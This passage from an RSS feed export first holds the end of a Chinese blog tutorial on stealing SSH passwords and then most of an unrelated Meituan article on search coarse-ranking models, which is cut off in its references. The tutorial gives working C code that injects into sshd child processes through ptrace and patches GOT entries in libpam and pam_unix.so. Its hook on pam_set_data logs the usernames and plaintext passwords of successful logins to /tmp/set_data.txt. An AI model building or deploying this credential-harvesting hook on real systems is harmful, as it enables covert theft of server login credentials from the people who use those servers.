PAM_ABORT;\n    }\n\n    /* are the modules reliable? */\n    if (mod_type != PAM_MT_DYNAMIC_MOD &amp;&amp;\n     mod_type != PAM_MT_FAULTY_MOD) {\n    D((\"_pam_add_handlers: illegal module library type; %d\", mod_type));\n    pam_syslog(pamh, LOG_ERR,\n            \"internal error: module library type not known: %s;%d\",\n            sym, mod_type);\n    return PAM_ABORT;\n    }\n\n    /* now identify this module's functions - for non-faulty modules */\n\n    if ((mod_type == PAM_MT_DYNAMIC_MOD) &amp;&amp;\n        !(func = _pam_dlsym(mod-&gt;dl_handle, sym)) ) {\n    pam_syslog(pamh, LOG_ERR, \"unable to resolve symbol: %s\", sym);\n    }\n    if (sym2) {\n    if ((mod_type == PAM_MT_DYNAMIC_MOD) &amp;&amp;\n        !(func2 = _pam_dlsym(mod-&gt;dl_handle, sym2)) ) {\n        pam_syslog(pamh, LOG_ERR, \"unable to resolve symbol: %s\", sym2);\n    }\n    }\n/* ..... 后面省略*/\n</code></pre><p>我们直接看到<code>_pam_dlsym</code>和<code>_pam_dlopen</code>，基本可以证明我们的猜想。</p><p>就是libpam是通过dlopen和dlsym动态加载的。我们只要hook了dlopen和dlsym，判断是否是pam_unix.so的不就行了？</p><p>（然而以上只是理论可行，实际上注入的时候不知道为什么老是HOOK不到dlopen的GOT表，出了一点问题，不知道为什么，百思不得姐，最后还是使用了其他方式，但是原理还是一样的，这个后面再说）</p><h1>怎么HOOK？-GOT HOOK</h1><p>最最最简单的办法是，inline hook，直接找到API地址，然后修改他们开头的字节，直接jmp到我们的函数地址，然后等我们函数执行完的时候再还原。</p><p>然而有个问题是，这是windows api的修改方法，我们这个是linux，修改的是外部so加载的地址。所以我们得转变个思路：我们是如何调用一个所加载so的导出函数地址的？这就涉及到了另一个东西，GOT表。大概意思就是这个表中加载的所有so的导出地址，有函数名-&gt;对应映射基地址等，只需要把这个表所对应的导出地址修改成我们函数的地址即可。</p><p>好，二话不说，github找段代码: <a href=\"https://github.com/zhougy0717/inject_got\">inject_got</a>，把这玩意编译成so文件拿去注入就OK了</p><p>现在我们有能力直接HOOK我们想要的函数了。</p><h1>验证猜想</h1><p>既然要素齐全，比起先上手写代码，我们可以先试试，最快速的验证方式是直接GDB打个断点，然后使用SSH连接，看看我们能否hook到dlopen就知道了。然后我们就照做了。</p><p><figure><img alt=\"1.png\" data-src=\"https://9bie.org/usr/uploads/2022/07/78200818.png\" src=\"https://9bie.org/usr/uploads/2022/07/78200818.png\"><figcaption>1.png</figcaption></figure></p><p>可以看到，我们用gdb直接载入sshd之后，用b给dlopen下了一个断点。结果并没有什么卯月，还给我们了弹了两个<code>process 1401834 is executing new program: /usr/sbin/sshd</code> 新子进程创建的提示。大胆猜测，会不会是这两个子进程是分开用来处理ssh登录请求的呢？我们真实要注入的地址其实是这些子进程？</p><p>我们通过ssh脸上自己之后，使用pstree来查看子进程。</p><p><figure><img alt=\"2.png\" data-src=\"https://9bie.org/usr/uploads/2022/07/2201916001.png\" src=\"https://9bie.org/usr/uploads/2022/07/2201916001.png\"><figcaption>2.png</figcaption></figure></p><p>可以看到sshd之后又跟了两个子进程，我们挨个挂载。直接b 跟进子进程</p><p><figure><img alt=\"3.png\" data-src=\"https://9bie.org/usr/uploads/2022/07/1608848997.png\" src=\"https://9bie.org/usr/uploads/2022/07/1608848997.png\"><figcaption>3.png</figcaption></figure></p><p>可以发现，并没有什么卯月，然而实际上，可能只是我们注入的时间晚了的缘故，在我们注入之前，这些函数都调用完了。还是继续回到strace来看看这些到底是如何做到的。</p><p>首先我们先看子进程是如何创建的。我们用strace记录了sshd进程再ssh接收到登录并且密码输入正确的时候（我截图的这个stree日志是之前记录的，那时候sshd的pid是9731）<br><figure><img alt=\"4.png\" data-src=\"https://9bie.org/usr/uploads/2022/07/1798889075.png\" src=\"https://9bie.org/usr/uploads/2022/07/1798889075.png\"><figcaption>4.png</figcaption></figure></p><p>在第一个子进程出现的时候，sshd调用了clone调用</p><pre><code>9731  clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD &lt;unfinished ...&gt;\n10242 set_robust_list(0x7f5ee78fbbe0, 24 &lt;unfinished ...&gt;\n9731  &lt;... clone resumed&gt;, child_tidptr=0x7f5ee78fbbd0) = 10242</code></pre><p>创建了子进程10242之后，clone返回了子进程的pid。</p><p>之后再有子进程调用clone，创建了子子进程10249</p><pre><code>10242 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fc005b0dbd0) = 10249</code></pre><p>符合之前pstree看到的结果。</p><p>然后再看我们的pam模块是怎么加载的，直接搜索.so相关的<br><figure><img alt=\"5.png\" data-src=\"https://9bie.org/usr/uploads/2022/07/3781963974.png\" src=\"https://9bie.org/usr/uploads/2022/07/3781963974.png\"><figcaption>5.png</figcaption></figure></p><p>可以看到，进行so相关操作的是由第二个子进程操作处理的，所以我们重点目光看向那就行。</p><h1>监控子进程</h1><p>既然每个ssh连接是由不同的子进程处理的，那么我们只注入sshd进程肯定是不行的了。因为子进程才是关键，根据strace结果，我们知道系统是调用了clone，并且还能拿到结果，那么就简单了，直接使用pstrace，拦截syscall调用就行，根据syscall调用表，我们知道clone的调用号是56。</p><p>大概伪代码如下</p><pre><code>    while(1){\n        ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );\n        waitpid( target_pid, NULL, WUNTRACED );\n        pthread_t id;\n        num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);// 获得调用号值\n        if(num == 56){ // 是调用了clone\n            printf(\"system call num = %ld\\n\", num);\n            ptrace_getregs( target_pid, &amp;regs ); // 获得调用结果\n            printf(\"Process maybe = %ld \\n\", regs.rax); \n            subprocess = regs.rax;\n            // do_something(subprocess);\n        }\n    }</code></pre><h1>控制注入顺序</h1><p>然而，知晓了clone创建的时间，还是不能直接HOOK进去修改dlopen。因为这时候注入进去，会发生一个问题，我们以上的那些模块操作都是在libpam中进行的，而我们这个进程并不是直接在子进程中的，所以如果我们直接使用上述的<code>inject_got</code>注入进去，会没办法修改到libpam中的dlopen。</p><p>直接看代码,原始代码<code>inject_got</code>中的代码应该是这样</p><pre><code>/* .... */\nchar buf[MAX_BUF_SIZE] = {0}; \nint err = get_exe_name(buf, sizeof(buf));\nvoid* base_addr = get_module_base(getpid(),buf); // 注意这个buf，这个buf是读取自身进程\n/* .... */</code></pre><p>其中<code>get_module_base</code>的作用是从<code>/prof/pid/maps</code>里读取模块的基地址，然后再载入内存ELF进行GOT表查找的，这里原始函数查找的是主模块（自身进程）的基地址，即便修改了主模块的GOT，libpam里的是不会照着主模块的GOT进行执行的，必须修改到libpam的GOT表。</p><p><figure><img alt=\"6.png\" data-src=\"https://9bie.org/usr/uploads/2022/07/3156581261.png\" src=\"https://9bie.org/usr/uploads/2022/07/3156581261.png\"><figcaption>6.png</figcaption></figure></p><p>但是根据上述所说，直接clone的时候就注入，libpam还没有载入到内存中，maps里就找不到基地址，修改GOT就更无从谈起，因此我们需要一个函数来判断libpam的加载，最简单的办法就是HOOK openat调用号进行判断。我们在我们原始的注入程序中加入以下判断</p><pre><code>int WaitforLibPAM(pid_t target_pid){\n    struct user_regs_struct regs;\n    if ( ptrace_attach( target_pid ) == -1 ){\n\n        printf(\"WaitforLibPAM attach Failed\\n\" );\n        return -1;\n    }\n    if ( ptrace_getregs( target_pid, &amp;regs ) == -1 ){\n        printf(\"-- Getregs Error\\n\" );\n        return -1;\n    }\n    //ptrace_continue( target_pid );\n    long num,bit=0,finded = 0;\n    char *path = malloc(255);\n    char libsystemd[] = \"common-session\";\n    while(1){\n        ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );\n        waitpid( target_pid, NULL, WUNTRACED );\n        num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);\n            //printf(\"++ SubProcess: system call num = %ld\\n\", num);\n        if(num ==257){\n            ptrace_getregs( target_pid, &amp;regs ) ;\n            printf(\"++ SubProcess: rsi :%p\\n\",regs.rsi);\n            //ptrace_writedata(target_pid,regs.rip,local_code_ptr,code_length );\n            //ptrace_continue( target_pid );\n            ptrace_readdata(target_pid,(void *)regs.rsi,path,255);\n            printf(\"++ SubProcess:openat path :%s\\n\",path);\n            if(strstr(path,libsystemd)){\n                ptrace_detach(target_pid);\n                // do_inject_so(target_pid);\n                break;\n            }\n        }\n    }\n}</code></pre><p>通过strace判断，打开<code>common-session</code>文件在打开<code>libpam.so</code>文件之后，因此只要判断openat打开了<code>common-session</code>就能知道<code>libpam</code>已经被加载了。</p><p>然后把<code>inject_got</code>中的代码修改一下</p><pre><code>void* base_addr = get_module_base(getpid(), \"/usr/lib/x86_64-linux-gnu/libpam.so.0.85.1\");</code></pre><p>这样后续的修改GOT就会是修改libpam的GOT了</p><h1>过程控制-读取密码</h1><p>回到上面的<code>pam_unix_auth.c</code>，我们知道了所有的函数都会调用<code>pam_sm_authenticate</code>，那么我们如何知道其中的密码，和如何判断密码正确？我们先看密码如何获取</p><p>直接看到<code>pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)</code>的第一个参数pamh，它是一个<code>pam_handle_t</code>结构如下，</p><pre><code>struct pam_handle {\n    char *authtok;\n    unsigned caller_is;\n    struct pam_conv *pam_conversation;\n    char *oldauthtok;\n    char *prompt;                /* for use by pam_get_user() */\n    char *service_name;\n    char *user;\n    char *rhost;\n    char *ruser;\n    char *tty;\n    char *xdisplay;\n    char *authtok_type;          /* PAM_AUTHTOK_TYPE */\n    struct pam_data *data;\n    struct pam_environ *env;      /* structure to maintain environment list */\n    struct _pam_fail_delay fail_delay;   /* helper function for easy delays */\n    struct pam_xauth_data xauth;        /* auth info for X display */\n    struct service handlers;\n    struct _pam_former_state former;  /* library state - support for\n                     event driven applications */\n    const char *mod_name;    /* Name of the module currently executed */\n    int mod_argc;               /* Number of module arguments */\n    char **mod_argv;            /* module arguments */\n    int choice;            /* Which function we call from the module */\n\n#ifdef HAVE_LIBAUDIT\n    int audit_state;             /* keep track of reported audit messages */\n#endif\n    int authtok_verified;\n    char *confdir;\n};</code></pre><p>很多看不懂的结构体甚至还有一个ifdef是不是？肯定有人会问了，\"这ifdef，说明这玩意的结构长度不定长，它函数传的又是指针，我们怎么知道它具体偏移是多少如果传错了咋办呀？\"</p><p>其实，我们真正需要的只有<code>authtok</code>和<code>user</code>，这两个成员地址，这两个偏移量是始终固定的，后续的成员要不要都无所谓,所以在我们的<code>inject_got</code>中只需要定义成如下</p><pre><code>struct pam_handle {\n    char *authtok;\n    unsigned caller_is;\n    struct pam_conv *pam_conversation;\n    char *oldauthtok;\n    char *prompt;                /* for use by pam_get_user() */\n    char *service_name;\n    char *user;\n    char *rhost;\n    char *ruser;\n    char *tty;\n    char *xdisplay;\n    char *authtok_type;          /* PAM_AUTHTOK_TYPE */\n};</code></pre><p>即可，反正传给我们的是指针，我们根据偏移读取到了账号和密码再把指针原封不动的传给原函数就行。</p><p>能获取到密码之后，我们就需要判断是如何验证密码了,继续看到<code>unic_pam_auth.c</code>，直接看到函数最后两行</p><pre><code>retval = _unix_verify_password(pamh, name, p, ctrl);\n    name = p = NULL;\n    AUTH_RETURN;</code></pre><p>通过理解代码，<code>_unix_verify_password</code>就是用来验证账号密码的，如果账号密码正确，retval返回值就是PAM_SUCCESS(定义为0)，那么后续呢？我们直接看<code>AUTH_RETURN</code></p><pre><code>#define AUTH_RETURN                        \\\ndo {                                    \\\n    D((\"recording return code for next time [%d]\",        \\\n                retval));            \\\n    *ret_data = retval;                    \\\n    pam_set_data(pamh, \"unix_setcred_return\",        \\\n             (void *) ret_data, setcred_free);    \\\n    D((\"done. [%s]\", pam_strerror(pamh, retval)));        \\\n    return retval;                        \\\n} while (0)</code></pre><p>可以看到retval就直接被返回回去了。所有条件达成。<br>我们只需要做一个HOOK函数</p><pre><code>int my_pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)\n{\n\n    int ret = old_pam_sm_authenticate(pamh,module_data_name,data,cleanup);\n    if(ret==0){\n        printf(\"login successful username is : %s    password is: %s\\n\",pamh-&gt;user,pamh-&gt;authtok);\n        // do something\n    }\n    return ret;\n}\n</code></pre><h1>组合-理想</h1><p>通过组合所有条件，我们手里有一个注入器，一个so（inject_got），我们的流程基本就是。</p><ul><li>注入器注入SSHD</li><li>注入器HOOK系统调用clone，判断子进程出现</li><li>注入器注入子进程</li><li>注入器HOOK子进程OPENAT，判断libpam是否装载完毕</li><li>libpam装载完毕，注入so文件(inject_got)</li><li>inject_got查找libpam中dlopen和dlsym的got并修改为my_dlopen和my_dlsym</li><li>等待执行dlopen时，跳转到my_dlopen</li><li>my_dlopen 记录下pam_unix.so 的 handle 地址，之后正常指行dlopen</li><li>等待指行dlsym时候，跳转到my_dlsym</li><li>my_dlsym判断加载的请求是否是pam_sm_authenticate</li><li>my_dlsym判断加载的handle是否是pam_unix.so</li><li>my_dlsym所有条件符合，把函数地址修改成my_pam_sm_authenticate</li><li>等待原本pam_unix.so中的pam_sm_authenticate将被执行时，跳转到my_pam_sm_authenticate</li><li>my_pam_sm_authenticate记录下用户密码，跳转到原始pam_sm_authenticate</li><li>判断原始pam_sm_authenticate是否为PAM_SUCCESS=0，是则代表密码正确，记录</li><li>密码记录完成</li></ul><h1>组合-现实</h1><p>这是理想情况，然而可恶的是，tmd不知道为什么inject_so老是无法修改dlopen的，倒是能找到dlsym的GOT表并修改，就很蛋疼，光有dlsym的函数地址也不是不行，但是问题就在于，调用<code>pam_sm_authenticate</code>的不止一个so，我不知道哪个handle是属于pam_unix.so的pam_sm_authenticate，不同的so文件中pam_sm_authenticate的返回值代表的也不一样。</p><p>本来想着能不能通过dlsym的handle，逆回去看看handle所对应的路径，然而看了下相关源码（linux就是这点好，可以遇事不决看源码），并没有相关操作。于是乎寄，我们只能找到另外HOOK点。</p><p>我们再次回到<code>_unix_verify_password</code>结束后流程中来，为什么直接看到这之后？因为这之前的代码是无法判断密码是否正确，所以哪怕HOOK了也没用。<code>_unix_verify_password</code>后的操作只有一个，那就是<code>AUTH_RETURN</code></p><pre><code>#define AUTH_RETURN                        \\\ndo {                                    \\\n    D((\"recording return code for next time [%d]\",        \\\n                retval));            \\\n    *ret_data = retval;                    \\\n    pam_set_data(pamh, \"unix_setcred_return\",        \\\n             (void *) ret_data, setcred_free);    \\\n    D((\"done. [%s]\", pam_strerror(pamh, retval)));        \\\n    return retval;                        \\\n} while (0)</code></pre><p>我们把木管看向<code>pam_set_data</code>，又有独一无二的字符串（指unix_setcred_return）让我们确认是属于位于这里的<code>pam_set_data</code>，又有先前<code>_unix_verify_password</code>运行后的结果的值（指<code>*ret_data = retval;</code>）</p><p>于是乎，我们很容易的就可以把目光转移到这个函数上来，这个函数在pam_unix.so中，所以我们要把之前的基地址从libpam改为pam_unix.so</p><pre><code>void* base_addr = get_module_base(getpid(), \"/usr/lib/x86_64-linux-gnu/security/pam_unix.so\");</code></pre><p>然后，我们在做一个hook函数</p><pre><code>int my_pam_set_data(struct pam_handle *pamh, const char *module_data_name, void *data,void* cleanup)\n{\n\n        char unix_setcred_return[] = \"unix_setcred_return\";\n        if(strstr(unix_setcred_return,module_data_name)){\n        FILE *fp = NULL;\n        fp = fopen(\"/tmp/set_data.txt\", \"a+\");\n        void * test = malloc(sizeof(int));\n        fprintf(fp,\"pam module_data_name: %s %d\\n\",module_data_name,*(int *)data);\n        int ret = *(int*)data;\n        if(ret == 0){\n                fprintf(fp,\"login successful username is : %s    password is: %s\\n\",pamh-&gt;user,pamh-&gt;authtok);\n        }\n        fclose(fp);\n        } \n        //if(strstr(module_data_name,unix_setcred_return)){\n        //while(1){} }\n    return old_pam_set_data(pamh,module_data_name,data,cleanup);\n}\n</code></pre><p>这样就大功告成辣！</p>"
    },
    "origin": {
        "streamId": 44,
        "title": "⑨BIE",
        "htmlUrl": "https://9bie.org/",
        "feedUrl": "https://9bie.org/index.php/feed/"
    }
},
{
    "id": "https://tech.meituan.com/2022/08/11/coarse-ranking-exploration-practice.html",
    "timestampUsec": "1660293837910962",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "美团搜索粗排优化的探索与实践",
    "author": ";美团技术团队",
    "published": 1660176000,
    "updated": 1660176000,
    "alternate": [
        {
            "href": "https://tech.meituan.com/2022/08/11/coarse-ranking-exploration-practice.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>1. 前言</h2><p>众所周知，在搜索、推荐、广告等大规模工业界应用领域，为了平衡性能和效果，排序系统普遍采用级联架构[1,2]，如下图 1 所示。以美团搜索排序系统为例，整个排序分为粗排、精排、重排和混排层；粗排位于召回和精排之间，需要从千级别候选 item 集合中筛选出百级别 item 集合送给精排层。</p><p><img src=\"https://p0.meituan.net/travelcube/98369798e211806810de1109354cce68121792.png\" alt=\"图1 排序漏斗\" referrerpolicy=\"no-referrer\"></p><p>从美团搜索排序全链路视角审视粗排模块，目前粗排层优化存在如下几个挑战点：</p><ul><li><strong>样本选择偏差</strong>：级联排序系统下，粗排离最后的结果展示环节较远，导致粗排模型离线训练样本空间与待预测的样本空间存在较大的差异，存在严重的样本选择偏差。</li><li><strong>粗排精排联动</strong>：粗排处于召回和精排之间，粗排需要更多获取和利用后续链路的信息来提升效果。</li><li><strong>性能约束</strong>：线上粗排预测的候选集远远高于精排模型，然而实际整个搜索系统对性能有严格的要求，导致粗排需要重点关注预测性能。</li></ul><p>本文将围绕上述挑战点来分享美团搜索粗排层优化的相关探索与实践，其中样本选择偏差问题我们放在精排联动问题中一起解决。本文主要分成三个部分：第一部分会简单介绍美团搜索排序粗排层的演进路线；第二部分介绍粗排优化的相关探索与实践，其中第一个工作是采用知识蒸馏和对比学习使精排和粗排联动来优化粗排效果，第二个工作是考虑粗排性能和效果 trade-off 的粗排优化，相关工作均已全量上线，且效果显著；最后是总结与展望部分，希望这些内容对大家有所帮助和启发。</p><h2>2. 粗排演进路线</h2><p>美团搜索的粗排技术演进分为以下几个阶段：</p><ul><li>2016 年：基于相关性、质量度、转化率等信息进行线性加权，这种方法简单但是特征的表达能力较弱，权重人工确定，排序效果存在很大的提升空间。</li><li>2017 年：采用基于机器学习的简单 LR 模型进行 Pointwise 预估排序。</li><li>2018 年：采用基于向量内积的双塔模型，两侧分别输入查询词、用户以及上下文特征和商户特征，经过深度网络计算后，分别产出用户&amp;查询词向量和商户向量，再通过内积计算得到预估分数进行排序。该方法可以提前把商户向量计算保存好，所以在线预测快，但是两侧信息的交叉能力有限。</li><li>2019 年：为了解决双塔模型无法很好地建模交叉特征的问题，将双塔模型的输出作为特征与其他交叉特征通过 GBDT 树模型进行融合。</li><li>2020 年至今：由于算力的提升，开始探索 NN 端到端粗排模型并且持续迭代 NN 模型。</li></ul><p>现阶段，工业界粗排模型常用的有双塔模型，比如腾讯[3]和爱奇艺[4]；交互式 NN 模型，比如阿里巴巴[1,2]。下文主要介绍美团搜索在粗排升级为 NN 模型过程中的相关优化工作，主要包括粗排效果优化、效果&amp;性能联合优化两个部分。</p><h2>3. 粗排优化实践</h2><p>随着大量的效果优化工作[5,6]在美团搜索精排 NN 模型落地，我们也开始探索粗排 NN 模型的优化。考虑到粗排有严格的性能约束，直接将精排优化的工作复用到粗排是不适用的。下面会介绍关于将精排的排序能力迁移到粗排的精排联动效果优化工作，以及基于神经网络结构自动搜索的效果和性能 trade-off 优化工作。</p><h3>3.1 精排联动效果优化</h3><p>粗排模型受限于打分性能约束，这会导致模型结构相比精排模型更加简单，特征数量也比精排少很多，因此排序效果要差于精排。为了弥补粗排模型结构简单、特征较少带来的效果损失，我们尝试知识蒸馏方法[7]来联动精排对粗排进行优化。</p><p>知识蒸馏是目前业界简化模型结构并最小化效果损失的普遍方法，它采取一种 Teacher-Student 范式：结构复杂、学习能力强的模型作为 Teacher 模型，结构较为简单的模型作为 Student 模型，通过 Teacher 模型来辅助 Student 模型训练，从而将 Teacher 模型的“知识”传递给 Student 模型，实现 Student 模型的效果提升。精排蒸馏粗排的示意图如下图 2 所示，蒸馏方案分为以下三种：精排结果蒸馏、精排预测分数蒸馏、特征表征蒸馏。下面会分别介绍这些蒸馏方案在美团搜索粗排中的实践经验。</p><p><img src=\"https://p1.meituan.net/travelcube/65f3f283eacf1193f4a6b069cefcecdf271853.png\" alt=\"图2 精排蒸馏粗排示意图\" referrerpolicy=\"no-referrer\"></p><h4>3.1.1 精排结果列表蒸馏</h4><p>粗排作为精排的前置模块，它的目标是初步筛选出质量比较好的候选集合进入精排，从训练样本选取来看，除了常规的用户发生行为（点击、下单、支付）的 item 作为正样本，曝光未发生行为的 item 作为负样本外，还可以引入一些通过精排模型排序结果构造的正负样本，这样既能一定程度缓解粗排模型的样本选择偏置，也能将精排的排序能力迁移到粗排。下面会介绍在美团搜索场景下，使用精排排序结果蒸馏粗排模型的实践经验。</p><p><strong>策略1</strong>：在用户反馈的正负样本基础上，随机选取少量精排排序靠后的未曝光样本作为粗排负样本的补充，如图 3 所示。该项改动离线 Recall@150（指标解释参看附录）+5PP，线上 CTR +0.1%。</p><p><img src=\"https://p1.meituan.net/travelcube/4a3fd85589c1882bdcd84376203cf58e150014.png\" alt=\"图3 补充排序结果靠后负例\" referrerpolicy=\"no-referrer\"></p><p><strong>策略2</strong>：直接在精排排序后的集合里面进行随机采样得到训练样本，精排排序的位置作为 label 构造 pair 对进行训练，如下图 4 所示。离线效果相比策略1 Recall@150 +2PP，线上 CTR +0.06%。</p><p><img src=\"https://p0.meituan.net/travelcube/60fb9f9eb7d78a6748093d08be09964d201430.png\" alt=\"图4 排序靠前靠后构成 pair 对样本\" referrerpolicy=\"no-referrer\"></p><p><strong>策略3</strong>：基于策略2的样本集选取，采用对精排排序位置进行分档构造 label ，然后根据分档 label 构造 pair 对进行训练。离线效果相比策略2 Recall@150 +3PP，线上 CTR +0.1%。</p><h4>3.1.2 精排预测分数蒸馏</h4><p>前面使用排序结果蒸馏是一种比较粗糙使用精排信息的方式，我们在这个基础上进一步添加预测分数蒸馏[8]，希望粗排模型输出的分数与精排模型输出的分数分布尽量对齐，如下图 5 所示：</p><p><img src=\"https://p0.meituan.net/travelcube/4d4e0d6db11ae44e516f24d8eb2abd28189647.png\" alt=\"图5 精排预测分数构造辅助损失\" referrerpolicy=\"no-referrer\"></p><p>在具体实现上，我们采用两阶段蒸馏范式，基于预先训练好的精排模型来蒸馏粗排模型，蒸馏 Loss 采用的是粗排模型输出和精排模型输出的最小平方误差，并且添加一个参数 Lambda 来控制蒸馏 Loss 对最终 Loss 的影响，如公式（1）所示。 使用精排分数蒸馏的方法，离线效果 Recall@150 +5PP，线上效果 CTR +0.05%。</p><p><img src=\"https://p0.meituan.net/travelcube/1d8aa6ab40481c1237029699ccec697c14029.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h4>3.1.3 特征表征蒸馏</h4><p>业界通过知识蒸馏实现精排指导粗排表征建模已经被验证是一种有效提升模型效果的方式[7]，然而直接用传统的方法蒸馏表征有以下缺陷：第一是无法蒸馏粗排和精排之间的排序关系，而前文已提到，排序结果蒸馏在我们的场景中，线下、线上均有效果提升；第二是传统采用 KL 散度作为表征度量的知识蒸馏方案，把表征的每一维独立对待，无法有效地蒸馏高度相关的、结构化的信息[9]，而在美团搜索场景下，数据是高度结构化的，因此采用传统的知识蒸馏策略来做表征蒸馏可能无法较好地捕获这种结构化的知识。</p><p><img src=\"https://p0.meituan.net/travelcube/4f9e6904232636262232ca90bedd9940292267.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/76b10e9fbd1e39da31a65ec2cd51cfe1475998.png\" alt=\"图6 对比学习精排信息迁移\" referrerpolicy=\"no-referrer\"></p><p>在上文公式 (1) 的基础上，补充对比学习表征蒸馏 Loss，离线效果 Recall@150 +14PP，线上 CTR +0.15%。相关工作的详细内容可以参考我们的论文[10]（正在投稿中）。</p><p><img src=\"https://p0.meituan.net/travelcube/5024fae3f94b2722081d86349e87abad16521.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h3>3.2 效果性能联合优化</h3><p>前面提到线上预测的粗排候选集较大，考虑到系统全链路性能的约束，粗排需要考虑预测效率。前文提到的工作都是基于简单 DNN + 蒸馏的范式来进行优化，但是存在如下两个问题：</p><ul><li>目前受限于线上性能而只使用了简单特征，未引入更加丰富的交叉特征，导致模型效果还有进一步提升的空间。</li><li>固定粗排模型结构的蒸馏会损失蒸馏效果，从而造成次优解[11]。</li></ul><p>根据我们的实践经验，直接在粗排层引入交叉特征是不能满足线上时延要求的。因此为了解决以上问题，我们探索并实践了基于神经网络架构搜索的粗排建模方案，该方案同时优化粗排模型的效果和性能，选择出满足粗排时延要求的最佳特征组合和模型结构，整体架构图如下图7所示：</p><p><img src=\"https://p0.meituan.net/travelcube/f752440fe78ab057e9750ed732021154959272.png\" alt=\"图7 基于 NAS 的特征和模型结构选择\" referrerpolicy=\"no-referrer\"></p><p>下面我们对其中的神经网络架构搜索（NAS）以及引入效率建模这两个关键技术点进行简单介绍：</p><p><img src=\"https://p0.meituan.net/travelcube/2010fe0380e405e845b9c7af360fc161482501.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p1.meituan.net/travelcube/88286a9e0d397e252d4201245cd37b6a392388.png\" alt=\"图8 模型延时计算图\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p1.meituan.net/travelcube/a237430d2ff8f17b6b7ed948b1143456126626.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/d2522cc6b80f4d6e1fa3cfde86501af2270658.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p>通过神经网络架构搜索的建模来联合优化粗排模型的效果和预测性能，离线 Recall@150 +11PP， 最终在线上延时不增加的情况下，线上指标 CTR +0.12%；详细工作可参考[13]，已被 KDD 2022 接收。</p><h2>4. 总结</h2><p>从 2020 年开始，我们通过大量的工程性能优化使粗排层落地 MLP 模型，在2021 年我们继续在 MLP 模型基础上，持续迭代粗排模型来提升粗排效果。首先，我们借鉴业界常用的蒸馏方案来联动精排优化粗排，从精排结果蒸馏、精排预测分数蒸馏、特征表征蒸馏三个层面分别进行了大量实验，在不增加线上延时的情况下，提升粗排模型效果。</p><p>其次，考虑到传统蒸馏方式无法很好处理排序场景中的特征结构化信息，我们自研了一套基于对比学习的精排信息迁移粗排方案。</p><p>最后，我们进一步考虑到粗排优化本质上是效果和性能的 trade-off，采用多目标建模的思路同时优化效果和性能，落地神经网络架构自动搜索技术来进行求解，让模型自动选择效率和效果最佳的特征集合和模型结构。后续我们会从以下几个方面继续迭代粗排层技术：</p><ul><li><strong>粗排多目标建模</strong>：目前的粗排本质上还是一个单目标模型，目前我们正在尝试将精排层的多目标建模应用于粗排。</li><li><strong>粗排联动的全系统动态算力分配</strong>：粗排可以控制召回的算力以及精排的算力，针对不同场景，模型需要的算力是不一样的，因此动态算力分配可以在不降低线上效果的情况下减小系统算力消耗，目前我们已经在这个方面取得了一定的线上效果。</li></ul><h2>5. 附录</h2><p>传统的排序离线指标多以 NDCG、MAP、AUC 类指标为标准，对于粗排来说，其本质更偏向于以集合选择为目标的召回类任务，因此传统的排序指标不利于衡量粗排模型迭代效果好坏。我们借鉴[6]中 Recall 指标作为粗排离线效果的衡量指标，即以精排排序结果为 ground truth，衡量粗排和精排排序结果 TopK 的对齐程度。Recall 指标具体定义如下：</p><p><img src=\"https://p0.meituan.net/travelcube/d4058b66afbe7261a1ea52eac5a7b16d292194.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p>该公式的物理含义即为衡量粗排排序前 K 个和精排排序前 K 的重合度，该指标更加符合粗排集合选择的本质。</p><h2>6. 作者简介</h2><p>晓江、所贵、李想、曹越、培浩、肖垚、达遥、陈胜、云森、利前等，均来自美团平台/搜索推荐算法部。</p><h2>7. 参考文献</h2><ul><li>[1] Wang Z, Zhao L, Jiang B, et al. Cold: Towards the next generation of pre-ranking system[J]. arXiv preprint arXiv:2007.16122, 2020.</li><li>[2] Ma X, Wang P, Zhao H, et al. Towards a Better Tradeoff between Effectiveness and Efficiency in Pre-Ranking: A Learnable Feature Selection based Approach[C]//Proceedings of the 44th International ACM SIGIR Conference on Research and Development in Information Retrieval. 2021: 2036-2040.</li><li>[3] <a href=\"https://mp.weixin.qq.com/s/Jfuc6x-Qt0rya5dbCR2uCA\">https://mp.weixin.qq.com/s/Jfuc6x-Qt0rya5dbCR2uCA</a></li><li>[4] <a href=\"https://mp.weixin.qq.com/s/RwWuZBSaoVXVmZpnyg7FHg\">https://mp.weixin.qq.com/s/RwWuZBSaoVXVmZpnyg7FHg</a></li><li>[5] <a href=\"https://tech.meituan.com/2020/04/16/transformer-in-meituan.html\">https://tech.meituan.com/2020/04/16/transformer-in-meituan.html</a>.</li><li>[6] <a href=\"https://tech.meituan.com/2021/07/08/multi-business-modeling.html\">https://tech.meituan.com/2021/07/08/multi-business-modeling.html</a>.</li><li>[7] Tang, Jiaxi, and Ke Wang. “Ranking distillation: Learning compact ranking models with high performance for recommender system.” Proceedings of the 24th ACM SIGKDD International Conference on Knowledge Discovery &amp; Data Mining. 2018.</li><li>[8] Hinton, Geoffrey, Oriol Vinyals, and Jeff Dean. “Distilling the knowledge in a neural network.” arXiv preprint arXiv:1503.02531 (2015).</li><li>[9] Chen L, Wang D, Gan Z, et al. Wasserstein contrastive representation distillation[C]//Proceedings of the IEEE/CVF conference on computer vision and pattern recognition. 2021: 16296-16305.</li><li>[10] <a href=\"https://arxiv.org/abs/2207.03073\">https://arxiv.org/abs/2207.03073</a></li><li>[11] Liu Y, 